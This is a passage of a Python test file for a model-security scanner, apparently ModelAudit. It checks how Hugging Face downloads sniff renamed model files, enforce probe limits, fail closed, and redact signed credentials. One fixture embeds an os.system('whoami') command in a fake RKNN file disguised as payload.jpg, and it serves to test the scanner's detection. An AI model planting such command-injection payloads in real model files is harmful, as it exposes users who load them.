        return_value=(["pytorch_model.bin", "hidden.payload"], _HF_TEST_REVISION, None),
    )
    @patch("requests.get")
    @patch("huggingface_hub.snapshot_download")
    def test_download_model_includes_bounded_content_routed_protobuf_payloads(
        self,
        mock_snapshot_download: MagicMock,
        mock_requests_get: MagicMock,
        _mock_list_repo_files: MagicMock,
        _mock_get_extensions: MagicMock,
        tmp_path: Path,
        payload_factory: Callable[[Path], bytes],
        expected_format: str,
    ) -> None:
        """Selective downloads should preserve renamed framework protobuf payloads."""
        payload = payload_factory(tmp_path)
        download_path = tmp_path / "download"
        download_path.mkdir()
        (download_path / "pytorch_model.bin").write_bytes(b"weights")
        (download_path / "hidden.payload").write_bytes(payload)
        mock_snapshot_download.return_value = str(download_path)
        mock_requests_get.return_value = _FakeRangeResponse(payload)

        download_model("https://huggingface.co/test/model")

        assert mock_snapshot_download.call_args.kwargs["allow_patterns"] == ["pytorch_model.bin", "hidden.payload"]
        assert mock_snapshot_download.call_args.kwargs["revision"] == _HF_TEST_REVISION
        assert detect_file_format_for_skip_filter(str(download_path / "hidden.payload")) == expected_format

    @pytest.mark.parametrize(
        "payload",
        [
            struct.pack("<Q", 4) + b"\x00" * 8,
            struct.pack("<Q", (16 * 1024 * 1024) + 1) + b"{" + b"\x00" * 7,
            b"\x0a\x07version\x0a\x03uid",
            (
                b"tree implementation notes\nversion=v4\nnum_class=1\nnum_tree_per_iteration=1\n"
                b"max_feature_idx=0\nnum_leaves=1\nsplit_feature=0\nleaf_value=0\n"
            ),
            b'<?xml version="1.0"?><project><PMML-not-root /></project>',
            b'{"framework":"ajax","payload":"not a JAX checkpoint"}',
            b"{" + _ubjson_key(b"learner") + b"{}" + _ubjson_key(b"metadata") + b"{}" + b"}",
            b'{"nodes":[{"op":"Custom"}],"arg_nodes":[],"heads":[[0,0,0]]}',
            b"\x0c\x00\x00\x00ETAA\x04\x00\x04\x00\x04\x00\x00\x00",
            b"\x0c\x00\x00\x00ET13\x04\x00\x04\x00\x00\x00\x00\x00",
            b"\x81\xa8metadata\xa4safe",
            b"import torch\nimport torch.nn as nn\n\nclass Model(nn.Module):\n    pass\n",
            b"\x7fELF" + b"\x02\x01\x01\x00" + b"\x00" * 56 + b"llama-file runtime",
            b"\x12\x02\x08\x01",
            b"\x08\x08\x12\x02\x08\x01",
            b"\x08\x08\x3a\x02\x08\x01",
            b"\x06\xc1" + b"\x00" * ((1024 * 1024) + 32),
        ],
        ids=[
            "malformed-safetensors",
            "truncated-oversized-safetensors",
            "cntk-notes",
            "lightgbm-notes",
            "xml-notes",
            "ajax-json",
            "xgboost-ubjson-near-match",
            "mxnet-notes",
            "executorch-near-match",
            "executorch-invalid-flatbuffer",
            "flax-msgpack-near-match",
            "torch7-source-near-match",
            "llamafile-near-match",
            "tensorflow-protobuf-near-match",
            "coreml-protobuf-near-match",
            "onnx-protobuf-near-match",
            "large-invalid-msgpack-near-match",
        ],
    )
    @patch("modelaudit.utils.sources.huggingface._get_model_extensions", return_value={".bin"})
    @patch(
        "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
        return_value=(["pytorch_model.bin", "hidden.payload"], _HF_TEST_REVISION, None),
    )
    @patch("requests.get")
    @patch("huggingface_hub.snapshot_download")
    def test_download_model_skips_benign_content_route_near_matches(
        self,
        mock_snapshot_download: MagicMock,
        mock_requests_get: MagicMock,
        _mock_list_repo_files: MagicMock,
        _mock_get_extensions: MagicMock,
        tmp_path: Path,
        payload: bytes,
    ) -> None:
        """Bounded content probes should not pull benign near-match files into snapshots."""
        download_path = tmp_path / "download"
        download_path.mkdir()
        (download_path / "pytorch_model.bin").write_bytes(b"weights")
        mock_snapshot_download.return_value = str(download_path)
        mock_requests_get.return_value = _FakeRangeResponse(payload)

        download_model("https://huggingface.co/test/model")

        assert mock_snapshot_download.call_args.kwargs["allow_patterns"] == ["pytorch_model.bin"]

    @pytest.mark.parametrize(
        ("response_headers", "response_status_code"),
        [
            ({"Content-Range": f"bytes 0-8191/{8 + 1 + (9 * 1024)}"}, 206),
            ({"Content-Length": str(8 + 1 + (9 * 1024))}, 200),
        ],
        ids=["partial-content-range", "full-content-length"],
    )
    @patch("modelaudit.utils.sources.huggingface._get_model_extensions", return_value={".bin"})
    @patch(
        "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
        return_value=(["pytorch_model.bin", "metadata.payload"], _HF_TEST_REVISION, None),
    )
    @patch("requests.get")
    @patch("huggingface_hub.snapshot_download")
    def test_download_model_uses_remote_size_to_reject_truncated_oversized_safetensors(
        self,
        mock_snapshot_download: MagicMock,
        mock_requests_get: MagicMock,
        _mock_list_repo_files: MagicMock,
        _mock_get_extensions: MagicMock,
        tmp_path: Path,
        response_headers: dict[str, str],
        response_status_code: int,
    ) -> None:
        """A disclosed short file must not satisfy an attacker-sized SafeTensors header."""
        payload = struct.pack("<Q", (16 * 1024 * 1024) + 1) + b"{" + b"\x00" * (9 * 1024)
        download_path = tmp_path / "download"
        download_path.mkdir()
        (download_path / "pytorch_model.bin").write_bytes(b"weights")
        mock_snapshot_download.return_value = str(download_path)
        mock_requests_get.return_value = _FakeRangeResponse(
            payload,
            headers=response_headers,
            status_code=response_status_code,
        )

        download_model("https://huggingface.co/test/model")

        assert mock_snapshot_download.call_args.kwargs["allow_patterns"] == ["pytorch_model.bin"]

    @patch("modelaudit.utils.sources.huggingface._get_model_extensions", return_value={".bin"})
    @patch(
        "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
        return_value=(["pytorch_model.bin", "weights.payload"], _HF_TEST_REVISION, None),
    )
    @patch("requests.get")
    @patch("huggingface_hub.snapshot_download")
    def test_download_model_preserves_disclosed_oversized_safetensors(
        self,
        mock_snapshot_download: MagicMock,
        mock_requests_get: MagicMock,
        _mock_list_repo_files: MagicMock,
        _mock_get_extensions: MagicMock,
        tmp_path: Path,
    ) -> None:
        """A plausible oversized header should remain scannable when it fits the remote file."""
        header_len = (16 * 1024 * 1024) + 1
        payload = struct.pack("<Q", header_len) + b"{" + b"\x00" * (9 * 1024)
        download_path = tmp_path / "download"
        download_path.mkdir()
        (download_path / "pytorch_model.bin").write_bytes(b"weights")
        safetensors_path = download_path / "weights.payload"
        with safetensors_path.open("wb") as handle:
            handle.write(payload)
            handle.truncate(8 + header_len)
        mock_snapshot_download.return_value = str(download_path)
        mock_requests_get.return_value = _FakeRangeResponse(
            payload,
            headers={"Content-Range": f"bytes 0-8191/{8 + header_len}"},
        )

        download_model("https://huggingface.co/test/model")

        assert mock_snapshot_download.call_args.kwargs["allow_patterns"] == [
            "pytorch_model.bin",
            "weights.payload",
        ]
        assert detect_file_format_for_skip_filter(str(safetensors_path)) == "safetensors"

    @patch("modelaudit.utils.sources.huggingface._get_model_extensions", return_value={".bin"})
    @patch(
        "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
        return_value=(["pytorch_model.bin", "evil.payload"], _HF_TEST_REVISION, None),
    )
    @patch(
        "requests.get",
        side_effect=PermissionError(
            "denied https://cas-bridge.xethub.hf.co/object?X-Amz-Credential=secret&X-Amz-Signature=signed"
        ),
    )
    @patch("huggingface_hub.snapshot_download")
    def test_download_model_fails_closed_when_skipped_file_cannot_be_inspected(
        self,
        mock_snapshot_download: MagicMock,
        _mock_requests_get: MagicMock,
        _mock_list_repo_files: MagicMock,
        _mock_get_extensions: MagicMock,
    ) -> None:
        """Skipped remote files must be inspectable before selective filtering excludes them."""
        with pytest.raises(Exception) as excinfo:
            download_model("https://huggingface.co/test/model")

        error = str(excinfo.value)
        assert "selective filtering incomplete" in error
        assert "evil.payload" in error
        assert "X-Amz-Credential" not in error
        assert "X-Amz-Signature" not in error
        mock_snapshot_download.assert_not_called()

    @patch("modelaudit.utils.sources.huggingface._get_model_extensions", return_value={".bin"})
    @patch(
        "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
        return_value=(["pytorch_model.bin", "hidden.payload"], _HF_TEST_REVISION, None),
    )
    @patch("requests.get")
    @patch("huggingface_hub.snapshot_download")
    def test_download_model_rejects_short_partial_response_without_content_range(
        self,
        mock_snapshot_download: MagicMock,
        mock_requests_get: MagicMock,
        _mock_list_repo_files: MagicMock,
        _mock_get_extensions: MagicMock,
    ) -> None:
        """A short 206 response cannot prove that a content probe reached EOF."""
        mock_requests_get.return_value = _FakeRangeResponse(
            b"\x81\xa6params\x81\xa1w\x91\x01",
            headers={},
            status_code=206,
        )

        with pytest.raises(Exception, match="selective filtering incomplete"):
            download_model("https://huggingface.co/test/model")

        mock_requests_get.assert_called_once()
        mock_snapshot_download.assert_not_called()

    @patch("modelaudit.utils.sources.huggingface._get_model_extensions", return_value={".bin"})
    @patch(
        "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
        return_value=(["pytorch_model.bin", "hidden.payload"], _HF_TEST_REVISION, None),
    )
    @patch("requests.get")
    @patch("huggingface_hub.snapshot_download")
    def test_download_model_rejects_short_partial_response_with_content_range(
        self,
        mock_snapshot_download: MagicMock,
        mock_requests_get: MagicMock,
        _mock_list_repo_files: MagicMock,
        _mock_get_extensions: MagicMock,
    ) -> None:
        """A short 206 response cannot claim a larger remote file and suppress routing."""
        mock_requests_get.return_value = _FakeRangeResponse(
            b"\x81\xa6params\x81\xa1w\x91\x01",
            headers={"Content-Range": "bytes 0-12/100000"},
            status_code=206,
        )

        with pytest.raises(Exception, match="selective filtering incomplete"):
            download_model("https://huggingface.co/test/model")

        mock_requests_get.assert_called_once()
        mock_snapshot_download.assert_not_called()

    @patch("modelaudit.utils.sources.huggingface._get_model_extensions", return_value={".bin"})
    @patch(
        "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
        return_value=(["pytorch_model.bin", "hidden.exe"], _HF_TEST_REVISION, None),
    )
    @patch("requests.get")
    @patch("huggingface_hub.snapshot_download")
    def test_download_model_preserves_tflite_blocked_suffix_guard(
        self,
        mock_snapshot_download: MagicMock,
        mock_requests_get: MagicMock,
        _mock_list_repo_files: MagicMock,
        _mock_get_extensions: MagicMock,
        tmp_path: Path,
    ) -> None:
        """Remote TFLite probes should match local blocked-suffix false-positive guards."""
        download_path = tmp_path / "download"
        download_path.mkdir()
        (download_path / "pytorch_model.bin").write_bytes(b"weights")
        mock_snapshot_download.return_value = str(download_path)
        mock_requests_get.return_value = _FakeRangeResponse(b"\x08\x00\x00\x00TFL3" + b"\x00" * 16)

        download_model("https://huggingface.co/test/model")

        assert mock_snapshot_download.call_args.kwargs["allow_patterns"] == ["pytorch_model.bin"]

    @patch("modelaudit.utils.sources.huggingface._get_model_extensions", return_value={".safetensors"})
    @patch(
        "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
        return_value=(["model.safetensors", "payload.jpg"], _HF_TEST_REVISION, None),
    )
    @patch("requests.get")
    @patch("huggingface_hub.snapshot_download")
    def test_download_model_includes_renamed_rknn_payload(
        self,
        mock_snapshot_download: MagicMock,
        mock_requests_get: MagicMock,
        _mock_list_repo_files: MagicMock,
        _mock_get_extensions: MagicMock,
        tmp_path: Path,
    ) -> None:
        """Remote selective filtering must retain renamed RKNN payloads for scanning."""
        download_path = tmp_path / "download"
        download_path.mkdir()
        (download_path / "model.safetensors").write_bytes(b"weights")
        (download_path / "payload.jpg").write_bytes(b"RKNN\x01\x00\x00\x00description=os.system('whoami')\n")
        mock_snapshot_download.return_value = str(download_path)
        mock_requests_get.return_value = _FakeRangeResponse(b"RKNN\x01\x00\x00\x00description=os.system('whoami')\n")

        download_model("https://huggingface.co/test/model")

        assert mock_snapshot_download.call_args.kwargs["allow_patterns"] == ["model.safetensors", "payload.jpg"]
        assert detect_file_format_for_skip_filter(str(download_path / "payload.jpg")) == "rknn"

    @patch("modelaudit.utils.sources.huggingface._get_model_extensions", return_value={".safetensors"})
    @patch(
        "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
        return_value=(["model.safetensors", "payload.pb"], _HF_TEST_REVISION, None),
    )
    @patch("requests.get")
    @patch("huggingface_hub.snapshot_download")
    def test_download_model_preserves_rknn_blocked_suffix_guard(
        self,
        mock_snapshot_download: MagicMock,
        mock_requests_get: MagicMock,
        _mock_list_repo_files: MagicMock,
        _mock_get_extensions: MagicMock,
        tmp_path: Path,
    ) -> None:
        """Remote RKNN probes should match local renamed-binary suffix guards."""
        download_path = tmp_path / "download"
        download_path.mkdir()
        (download_path / "model.safetensors").write_bytes(b"weights")
        mock_snapshot_download.return_value = str(download_path)
        mock_requests_get.return_value = _FakeRangeResponse(b"RKNN\x01\x00\x00\x00payload")

        download_model("https://huggingface.co/test/model")

        assert mock_snapshot_download.call_args.kwargs["allow_patterns"] == ["model.safetensors"]

    @pytest.mark.parametrize(
        ("filename", "payload"),
        [
            ("graph.pb", b"T7\x00\x00" + b"\x00" * 16),
            ("weights.model", b"B\x00C\x00N\x00\x00\x00" + b"\x00" * 16),
        ],
        ids=["torch7", "cntk"],
    )
    @patch("modelaudit.utils.sources.huggingface._get_model_extensions", return_value={".safetensors"})
    @patch("requests.get")
    @patch("huggingface_hub.snapshot_download")
    def test_download_model_preserves_magic_route_suffix_guards(
        self,
        mock_snapshot_download: MagicMock,
        mock_requests_get: MagicMock,
        _mock_get_extensions: MagicMock,
        filename: str,
        payload: bytes,
        tmp_path: Path,
    ) -> None:
        """Remote magic probes must preserve local filename-dependent false-positive guards."""
        download_path = tmp_path / "download"
        download_path.mkdir()
        (download_path / "model.safetensors").write_bytes(b"weights")
        mock_snapshot_download.return_value = str(download_path)
        mock_requests_get.return_value = _FakeRangeResponse(payload)

        with patch(
            "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
            return_value=(["model.safetensors", filename], _HF_TEST_REVISION, None),
        ):
            download_model("https://huggingface.co/test/model")

        assert mock_snapshot_download.call_args.kwargs["allow_patterns"] == ["model.safetensors"]

    @pytest.mark.parametrize("blocked_suffix", [".bin", ".meta", ".pb"])
    @patch("modelaudit.utils.sources.huggingface._get_model_extensions", return_value={".safetensors"})
    @patch("requests.get")
    @patch("huggingface_hub.snapshot_download")
    def test_download_model_preserves_executorch_blocked_suffix_guard(
        self,
        mock_snapshot_download: MagicMock,
        mock_requests_get: MagicMock,
        _mock_get_extensions: MagicMock,
        blocked_suffix: str,
        tmp_path: Path,
    ) -> None:
        """Remote ExecuTorch probes should match local renamed-binary suffix guards."""
        filename = f"payload{blocked_suffix}"
        payload = b"\x0c\x00\x00\x00ET13\x04\x00\x04\x00\x04\x00\x00\x00"
        download_path = tmp_path / "download"
        download_path.mkdir()
        (download_path / "model.safetensors").write_bytes(b"weights")
        mock_snapshot_download.return_value = str(download_path)
        mock_requests_get.return_value = _FakeRangeResponse(payload)

        with patch(
            "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
            return_value=(["model.safetensors", filename], _HF_TEST_REVISION, None),
        ):
            download_model("https://huggingface.co/test/model")

        assert mock_snapshot_download.call_args.kwargs["allow_patterns"] == ["model.safetensors"]

    @patch("modelaudit.utils.sources.huggingface._HF_CONTENT_SNIFF_MAX_FILES", 1)
    @patch("modelaudit.utils.sources.huggingface._get_model_extensions", return_value={".bin"})
    @patch("modelaudit.utils.sources.huggingface._detect_huggingface_content_route_format", return_value=None)
    @patch(
        "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
        return_value=(["pytorch_model.bin", "preview.png", "notes.txt"], _HF_TEST_REVISION, None),
    )
    @patch("huggingface_hub.snapshot_download")
    def test_download_model_caps_skipped_file_content_probes(
        self,
        mock_snapshot_download: MagicMock,
        _mock_list_repo_files: MagicMock,
        mock_detect_content: MagicMock,
        _mock_get_extensions: MagicMock,
    ) -> None:
        """Selective filtering should fail closed instead of issuing unbounded remote probes."""
        with pytest.raises(Exception, match="skipped file inspection limit exceeded"):
            download_model("https://huggingface.co/test/model")

        mock_detect_content.assert_called_once_with("test/model", "preview.png", _HF_TEST_REVISION, ANY)
        mock_snapshot_download.assert_not_called()

    @patch("modelaudit.utils.sources.huggingface._HF_CONTENT_SNIFF_MAX_TOTAL_BYTES", 8 * 1024)
    @patch("modelaudit.utils.sources.huggingface._get_model_extensions", return_value={".bin"})
    @patch(
        "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
        return_value=(["pytorch_model.bin", "hidden.payload"], _HF_TEST_REVISION, None),
    )
    @patch("requests.get")
    @patch("huggingface_hub.snapshot_download")
    def test_download_model_caps_total_content_probe_bytes(
        self,
        mock_snapshot_download: MagicMock,
        mock_requests_get: MagicMock,
        _mock_list_repo_files: MagicMock,
        _mock_get_extensions: MagicMock,
    ) -> None:
        """Selective filtering should fail closed before aggregate remote probes grow unbounded."""
        mock_requests_get.return_value = _FakeRangeResponse(
            b"{" + (b" " * ((8 * 1024) - 1)),
            status_code=206,
            headers={"Content-Range": "bytes 0-8191/100000"},
        )

        with pytest.raises(Exception, match="skipped file inspection byte limit exceeded"):
            download_model("https://huggingface.co/test/model")

        mock_requests_get.assert_called_once()
        mock_snapshot_download.assert_not_called()

    @patch("modelaudit.utils.sources.huggingface.time.monotonic", return_value=100.0)
    @patch("modelaudit.utils.sources.huggingface._get_model_extensions", return_value={".bin"})
    @patch(
        "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
        return_value=(["pytorch_model.bin", "hidden.payload"], _HF_TEST_REVISION, None),
    )
    @patch("modelaudit.utils.sources.huggingface._get_model_size_with_deadline", return_value=None)
    @patch("requests.get")
    @patch("huggingface_hub.snapshot_download")
    def test_download_model_deadline_stops_content_probes(
        self,
        mock_snapshot_download: MagicMock,
        mock_requests_get: MagicMock,
        _mock_get_model_size: MagicMock,
        _mock_list_repo_files: MagicMock,
        _mock_get_extensions: MagicMock,
        _mock_monotonic: MagicMock,
    ) -> None:
        """Non-streaming acquisition should stop before a probe exceeds the scan deadline."""

        def expire_probe_budget(budget: _HuggingFaceProbeBudget, repo_id: str) -> float:
            assert budget.deadline == 101.0
            raise TimeoutError(f"Hugging Face acquisition timed out for {repo_id}")

        with (
            patch.object(
                _HuggingFaceProbeBudget,
                "request_timeout",
                autospec=True,
                side_effect=expire_probe_budget,
            ),
            pytest.raises(
                Exception,
                match=r"(?:hidden\.payload \(TimeoutError\)|acquisition timed out for test/model)",
            ),
        ):
            download_model("https://huggingface.co/test/model", timeout_seconds=1)

        _mock_list_repo_files.assert_called_once_with("test/model", 1.0, deadline=101.0)
        mock_requests_get.assert_not_called()
        mock_snapshot_download.assert_not_called()

    @patch("modelaudit.utils.sources.huggingface.time.monotonic", return_value=100.0)
    @patch("modelaudit.utils.sources.huggingface._get_model_size_with_deadline")
    def test_download_model_starts_deadline_before_model_size_lookup(
        self,
        mock_get_model_size: MagicMock,
        _mock_monotonic: MagicMock,
    ) -> None:
        """Optional model-size metadata must consume the end-to-end acquisition budget."""
        mock_get_model_size.side_effect = RuntimeError("stop after model-size lookup")

        with pytest.raises(RuntimeError, match="stop after model-size lookup"):
            download_model("https://huggingface.co/test/model", timeout_seconds=1)

        mock_get_model_size.assert_called_once_with("test/model", 101.0)

    @patch("modelaudit.utils.sources.huggingface._run_huggingface_worker_with_deadline")
    def test_huggingface_path_sizes_use_terminable_deadline_worker(
        self,
        mock_run_worker: MagicMock,
    ) -> None:
        """Capped metadata requests should remain terminable under the shared deadline."""
        mock_run_worker.return_value = {
            "value": {
                "revision": _HF_TEST_REVISION,
                "sizes": [{"path": "model.bin", "size": 7}],
            }
        }

        sizes, revision = _get_huggingface_path_sizes(
            "test/model",
            ["model.bin"],
            resolved_revision=_HF_TEST_REVISION,
            deadline=123.0,
        )

        assert sizes == {"model.bin": 7}
        assert revision == _HF_TEST_REVISION
        mock_run_worker.assert_called_once_with(
            "get_path_sizes",
            {
                "repo_id": "test/model",
                "filenames": ["model.bin"],
                "requested_revision": None,
                "resolved_revision": _HF_TEST_REVISION,
            },
            123.0,
            "test/model",
        )

    @patch("modelaudit.utils.sources.huggingface.time.monotonic", return_value=100.0)
    @patch("requests.get")
    def test_huggingface_prefix_rechecks_deadline_between_chunks(
        self,
        mock_requests_get: MagicMock,
        _mock_monotonic: MagicMock,
    ) -> None:
        """A slow streaming response must not run past the acquisition deadline."""
        response = MagicMock()
        response.__enter__.return_value = response

        def iter_content(*_args: object, **_kwargs: object) -> Iterator[bytes]:
            yield b"first"
            _mock_monotonic.return_value = 102.0
            yield b"second"

        response.iter_content.side_effect = iter_content
        mock_requests_get.return_value = response
        budget = _HuggingFaceProbeBudget(remaining_bytes=1024, deadline=101.0)

        with pytest.raises(ValueError, match=r"payload\.bin \(TimeoutError\)"):
            _read_huggingface_prefix("test/model", "payload.bin", _HF_TEST_REVISION, budget, 1024)

        response.raise_for_status.assert_called_once_with()

    @patch("modelaudit.utils.sources.huggingface._terminate_huggingface_download_process")
    @patch("modelaudit.utils.sources.huggingface.subprocess.Popen")
    def test_download_worker_is_terminated_at_deadline(
        self,
        mock_popen: MagicMock,
        mock_terminate: MagicMock,
    ) -> None:
        """A blocking SDK transfer must not outlive the acquisition deadline."""
        process = mock_popen.return_value
        process.args = ["worker"]
        process.communicate.side_effect = subprocess.TimeoutExpired(process.args, timeout=1)

        with pytest.raises(TimeoutError, match="acquisition timed out"):
            _run_huggingface_download_with_deadline(
                "snapshot_download",
                {"repo_id": "test/model"},
                time.monotonic() + 1,
                "test/model",
            )

        mock_terminate.assert_called_once_with(process)

    @patch("modelaudit.utils.sources.huggingface.subprocess.Popen")
    def test_download_worker_captures_unredacted_child_stderr(self, mock_popen: MagicMock) -> None:
        """SDK diagnostics must not bypass the parent's Hugging Face URL redaction."""
        process = mock_popen.return_value
        process.communicate.return_value = (
            'MODELAUDIT_HF_DOWNLOAD_RESULT={"ok": true, "path": "/tmp/model"}\n',
            "https://cdn.example/model?token=secret",
        )

        result = _run_huggingface_download_with_deadline(
            "snapshot_download",
            {"repo_id": "test/model"},
            time.monotonic() + 1,
            "test/model",
        )

        assert result == "/tmp/model"
        assert mock_popen.call_args.kwargs["stderr"] is subprocess.PIPE

    @patch("modelaudit.utils.sources.huggingface.subprocess.Popen")
    def test_download_worker_redacts_signed_transport_error(self, mock_popen: MagicMock) -> None:
        """Serialized worker failures must not expose signed CDN credentials."""
        process = mock_popen.return_value
        process.communicate.return_value = (
            "MODELAUDIT_HF_DOWNLOAD_RESULT="
            '{"ok": false, "error_type": "HTTPError", '
            '"error": "denied https://user:pass@cas-bridge.xethub.hf.co/object?'
            'X-Amz-Credential=secret&X-Amz-Signature=signed"}\n',
            "",
        )

        with pytest.raises(RuntimeError) as exc_info:
            _run_huggingface_download_with_deadline(
                "snapshot_download",
                {"repo_id": "test/model"},
                time.monotonic() + 1,
                "test/model",
            )

        error = str(exc_info.value)
        assert "user:pass" not in error
        assert "secret" not in error
        assert "signed" not in error
        assert "X-Amz-Credential=<redacted>" in error
        assert "X-Amz-Signature=<redacted>" in error

    @patch("modelaudit.utils.sources.huggingface._terminate_huggingface_download_process")
    @patch("modelaudit.utils.sources.huggingface.subprocess.Popen")
    def test_download_worker_is_terminated_on_parent_interrupt(
        self,
        mock_popen: MagicMock,
        mock_terminate: MagicMock,
    ) -> None:
        """Parent interrupts must not leave a transfer subprocess running."""
        process = mock_popen.return_value
        process.communicate.side_effect = KeyboardInterrupt

        with pytest.raises(KeyboardInterrupt):
            _run_huggingface_download_with_deadline(
                "snapshot_download",
                {"repo_id": "test/model"},
                time.monotonic() + 1,
                "test/model",
            )

        mock_terminate.assert_called_once_with(process)

    @pytest.mark.skipif(not hasattr(os, "killpg"), reason="requires POSIX process groups")
    @patch("modelaudit.utils.sources.huggingface.os.killpg")
    def test_download_worker_terminates_posix_process_group(self, mock_killpg: MagicMock) -> None:
        """Timeout cleanup must stop transfer helpers launched by the worker."""
        process = MagicMock()
        process.pid = 1234
        process.communicate.side_effect = [
            subprocess.TimeoutExpired(["worker"], timeout=1),
            ("", ""),
        ]

        with patch("modelaudit.utils.sources.huggingface.os.name", "posix"):
            _terminate_huggingface_download_process(process)

        assert mock_killpg.call_args_list == [
            call(1234, getattr(signal, "SIGTERM", 15)),
            call(1234, getattr(signal, "SIGKILL", 9)),
        ]
        process.terminate.assert_not_called()
        process.kill.assert_not_called()

    @patch("modelaudit.utils.sources.huggingface._run_huggingface_download_with_deadline")
    @patch(
        "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
        return_value=(["model.bin"], _HF_TEST_REVISION, None),
    )
    def test_download_model_bounds_snapshot_transfer(
        self,
        _mock_list_repo_files: MagicMock,
        mock_run_download: MagicMock,
        tmp_path: Path,
    ) -> None:
        """The snapshot transfer should receive the remaining end-to-end deadline."""
        download_path = tmp_path / "download"
        download_path.mkdir()
        (download_path / "model.bin").write_bytes(b"weights")
        mock_run_download.return_value = str(download_path)

        result = download_model(
            "https://huggingface.co/test/model",
            cache_dir=tmp_path / "cache",
            timeout_seconds=30,
        )

        assert result == download_path
        operation, kwargs, deadline, repo_id = mock_run_download.call_args.args
        assert operation == "snapshot_download"
        assert kwargs["repo_id"] == "test/model"
        assert deadline > time.monotonic()
        assert repo_id == "test/model"

    @patch("huggingface_hub.HfApi.repo_info")
    def test_list_repo_files_at_revision_returns_matching_sha(self, mock_repo_info: MagicMock) -> None:
        """Capped downloads should keep the listing and transfer on one immutable revision."""
        mock_repo_info.return_value = SimpleNamespace(
            sha=TEST_COMMIT_SHA,
            siblings=[SimpleNamespace(rfilename="pytorch_model.bin")],
        )

        repo_files, revision = _list_huggingface_repo_files_at_revision("test/model", timeout_seconds=7)

        assert repo_files == ["pytorch_model.bin"]
        assert revision == TEST_COMMIT_SHA
        mock_repo_info.assert_called_once_with("test/model", timeout=7, files_metadata=False)

    @patch("huggingface_hub.HfApi.repo_info")
    def test_list_repo_files_at_revision_rejects_mutable_revision(self, mock_repo_info: MagicMock) -> None:
        """Capped downloads must not trust a mutable or abbreviated revision."""
        mock_repo_info.return_value = SimpleNamespace(
            sha="main",
            siblings=[SimpleNamespace(rfilename="pytorch_model.bin")],
        )

        with pytest.raises(Exception, match="repository revision unavailable"):
            _list_huggingface_repo_files_at_revision("test/model")

    @patch("modelaudit.utils.sources.huggingface._detect_huggingface_content_route_format", return_value=None)
    @patch("modelaudit.utils.sources.huggingface.get_model_size", return_value=None)
    @patch("modelaudit.utils.sources.huggingface._get_model_extensions", return_value={"", ".bin"})
    @patch(
        "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
        return_value=(["notes.unknown"], _HF_TEST_REVISION, None),
    )
    @patch("huggingface_hub.snapshot_download")
    def test_download_model_listing_success_without_scannable_files_fails_closed(
        self,
        mock_snapshot_download: MagicMock,
        _mock_list_repo_files: MagicMock,
        _mock_get_extensions: MagicMock,
        _mock_get_model_size: MagicMock,
        _mock_detect_content: MagicMock,
        tmp_path: Path,
    ) -> None:
        """A successful listing with no scannable files must not fall back to a full snapshot."""
        cache_dir = tmp_path / "cache"
        download_path = cache_dir / "huggingface" / "test" / "model"

        with pytest.raises(
            Exception,
            match="Refusing to download full snapshot for test/model: "
            "repository listing contains no recognized ModelAudit-scannable files",
        ):
            download_model("https://huggingface.co/test/model", cache_dir=cache_dir)

        mock_snapshot_download.assert_not_called()
        assert not download_path.exists()

    @patch("modelaudit.utils.sources.huggingface._detect_huggingface_content_route_format", return_value=None)
    @patch("modelaudit.utils.sources.huggingface.get_model_size", return_value=None)
    @patch("modelaudit.utils.sources.huggingface._get_model_extensions", return_value={"", ".bin"})
    @patch(
        "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
        return_value=(["notes.unknown"], _HF_TEST_REVISION, None),
    )
    @patch("huggingface_hub.snapshot_download")
    def test_download_model_listing_without_scannable_files_preserves_existing_cache(
        self,
        mock_snapshot_download: MagicMock,
        _mock_list_repo_files: MagicMock,
        _mock_get_extensions: MagicMock,
        _mock_get_model_size: MagicMock,
        _mock_detect_content: MagicMock,
        tmp_path: Path,
    ) -> None:
        """Fail-closed listing checks must not delete a user's preexisting cache."""
        cache_dir = tmp_path / "cache"
        download_path = cache_dir / "huggingface" / "test" / "model"
        download_path.mkdir(parents=True)
        cached_file = download_path / "cached.bin"
        cached_file.write_bytes(b"cached")

        with pytest.raises(Exception, match="repository listing contains no recognized ModelAudit-scannable files"):
            download_model("https://huggingface.co/test/model", cache_dir=cache_dir)

        mock_snapshot_download.assert_not_called()
        assert cached_file.read_bytes() == b"cached"

    @patch("modelaudit.utils.sources.huggingface.get_model_size", return_value=None)
    @patch(
        "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
        return_value=([], _HF_TEST_REVISION, None),
    )
    @patch("huggingface_hub.snapshot_download")
    def test_download_model_empty_listing_fails_closed(
        self,
        mock_snapshot_download: MagicMock,
        _mock_list_repo_files: MagicMock,
        _mock_get_model_size: MagicMock,
    ) -> None:
        """An empty successful listing should not trigger a full-snapshot download."""
        with pytest.raises(
            Exception,
            match="Refusing to download full snapshot for test/model: "
            "repository listing contains no recognized ModelAudit-scannable files",
        ):
            download_model("https://huggingface.co/test/model")

        mock_snapshot_download.assert_not_called()

    @patch("modelaudit.utils.sources.huggingface.get_model_size", return_value=None)
    @patch("modelaudit.utils.sources.huggingface._get_model_extensions", return_value={".safetensors"})
    @patch(
        "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
        return_value=(["nested/MODEL.SaFeTeNsOrS"], _HF_TEST_REVISION, None),
    )
    @patch("huggingface_hub.snapshot_download")
    def test_download_model_listing_accepts_mixed_case_scannable_suffix(
        self,
        mock_snapshot_download: MagicMock,
        _mock_list_repo_files: MagicMock,
        _mock_get_extensions: MagicMock,
        _mock_get_model_size: MagicMock,
        tmp_path: Path,
    ) -> None:
        """Supported remote suffixes should match local case-insensitive routing."""
        download_path = tmp_path / "download"
        model_path = download_path / "nested" / "MODEL.SaFeTeNsOrS"
